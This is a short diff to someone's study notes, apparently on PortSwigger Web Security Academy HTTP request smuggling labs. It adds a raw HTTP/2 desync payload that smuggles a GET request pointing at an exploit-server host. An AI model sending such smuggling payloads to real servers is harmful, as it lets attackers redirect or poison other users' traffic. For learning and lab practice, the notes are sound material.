@@ -96,3 +96,16 @@ The front-end server adds an HTTP header to incoming requests containing their I
 - CL.0 desync: h2CL|GET /favicon.ico
 ![[Pasted image 20240817070314.png]]
 
+```
+POST / HTTP/2
+Host: 0ae4007e047995e985021e1b0017001d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0a85002a042a95da85241d7a010e007b.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
